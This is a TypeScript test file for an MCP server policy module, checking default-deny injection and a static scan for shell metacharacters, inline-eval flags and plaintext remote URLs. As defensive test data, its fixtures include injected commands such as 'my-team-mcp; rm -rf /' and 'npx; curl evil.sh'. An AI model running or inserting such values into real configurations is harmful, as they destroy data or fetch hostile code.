/**
 * Tests for mcp-policy.ts — default-deny auto-injection and the static scan.
 *
 * Validates:
 * - every curated ENVIRONMENT_RULES server passes auto-injection (the
 *   allowlist is derived from the catalog, so the detector feature keeps
 *   working end to end)
 * - unknown servers and tampered configs are blocked by default-deny, even
 *   when they look otherwise harmless (persisted session state and
 *   session-create payloads are untrusted inputs)
 * - the scan flags shell metacharacters, inline-eval flags, and plaintext
 *   http URLs to non-local hosts
 * - CAMPFIRE_MCP_AUTO_INJECT_POLICY=permissive admits everything but keeps
 *   findings visible (downgraded to warns)
 */
import { afterEach, describe, expect, it } from "vitest";
import { evaluateAutoInjection, scanMcpServerConfig, scanMcpServers } from "./mcp-policy.js";
import { ENVIRONMENT_RULES } from "./environment-rules.js";
import type { McpServerConfig } from "./session-types.js";

afterEach(() => {
  delete process.env.CAMPFIRE_MCP_AUTO_INJECT_POLICY;
});

describe("evaluateAutoInjection — default-deny", () => {
  it("admits every curated environment-rule server unchanged", () => {
    const servers: Record<string, McpServerConfig> = {};
    for (const rule of ENVIRONMENT_RULES) {
      if (rule.mcpServer) servers[rule.id] = rule.mcpServer;
    }
    expect(Object.keys(servers).length).toBeGreaterThan(0);

    const verdict = evaluateAutoInjection(servers);
    expect(verdict.blocked).toEqual([]);
    expect(Object.keys(verdict.allowed).sort()).toEqual(Object.keys(servers).sort());
  });

  it("blocks a server that is not in the curated catalog", () => {
    const verdict = evaluateAutoInjection({
      "evil-helper": { type: "stdio", command: "npx", args: ["-y", "totally-legit-mcp"] },
    });
    expect(verdict.allowed).toEqual({});
    expect(verdict.blocked).toHaveLength(1);
    expect(verdict.blocked[0].reason).toContain("not in the curated");
  });

  it("blocks a curated rule id whose config was tampered with", () => {
    // Same name as the real supabase rule, but the args point elsewhere —
    // exactly what a tampered session file would look like.
    const verdict = evaluateAutoInjection({
      supabase: { type: "stdio", command: "npx", args: ["-y", "malicious-package"] },
    });
    expect(verdict.allowed).toEqual({});
    expect(verdict.blocked[0].reason).toContain("does not match the curated catalog");
  });

  it("permissive escape hatch admits unknown servers but keeps findings as warns", () => {
    process.env.CAMPFIRE_MCP_AUTO_INJECT_POLICY = "permissive";
    const verdict = evaluateAutoInjection({
      custom: { type: "stdio", command: "npx", args: ["-y", "my-team-mcp; rm -rf /"] },
    });
    expect(Object.keys(verdict.allowed)).toEqual(["custom"]);
    expect(verdict.blocked.every((f) => f.severity === "warn")).toBe(true);
    expect(verdict.blocked.length).toBeGreaterThan(0);
  });
});

describe("scanMcpServerConfig — static checks", () => {
  it("flags shell metacharacters in command and args as blocking", () => {
    const inCommand = scanMcpServerConfig("s", { type: "stdio", command: "npx; curl evil.sh" });
    expect(inCommand.some((f) => f.severity === "block" && f.reason.includes("command contains"))).toBe(true);

    const inArgs = scanMcpServerConfig("s", { type: "stdio", command: "npx", args: ["-y", "pkg && bad"] });
    expect(inArgs.some((f) => f.severity === "block" && f.reason.includes("argument contains"))).toBe(true);
  });

  it("flags inline-eval flags as blocking", () => {
    const findings = scanMcpServerConfig("s", { type: "stdio", command: "node", args: ["-e", "process.exit(0)"] });
    expect(findings.some((f) => f.severity === "block" && f.reason.includes("inline-eval"))).toBe(true);
  });

  it("flags plaintext http URLs to non-local hosts, allows localhost", () => {
    const remote = scanMcpServerConfig("s", { type: "http", url: "http://mcp.example.com/rpc" });
    expect(remote.some((f) => f.severity === "block" && f.reason.includes("plaintext http"))).toBe(true);

    const local = scanMcpServerConfig("s", { type: "http", url: "http://localhost:9000/rpc" });
    expect(local.filter((f) => f.severity === "block")).toEqual([]);
  });

  it("warns (not blocks) on unrecognized launcher commands", () => {
    const findings = scanMcpServerConfig("s", { type: "stdio", command: "/opt/custom/my-server" });
    expect(findings.some((f) => f.severity === "warn" && f.reason.includes("not a recognized"))).toBe(true);
    expect(findings.filter((f) => f.severity === "block")).toEqual([]);
  });

  it("passes clean https and curated-style npx configs with no findings", () => {
    expect(scanMcpServerConfig("s", { type: "sse", url: "https://mcp.example.com/sse" })).toEqual([]);
    expect(scanMcpServerConfig("s", { type: "stdio", command: "npx", args: ["-y", "@stripe/mcp"] })).toEqual([]);
  });
});

describe("scanMcpServers — map form", () => {
  it("aggregates findings across servers", () => {
    const findings = scanMcpServers({
      good: { type: "stdio", command: "bunx", args: ["-y", "fine-mcp"] },
      bad: { type: "stdio", command: "node", args: ["--eval", "x"] },
    });
    expect(findings.every((f) => f.server === "bad")).toBe(true);
    expect(findings.length).toBeGreaterThan(0);
  });
});
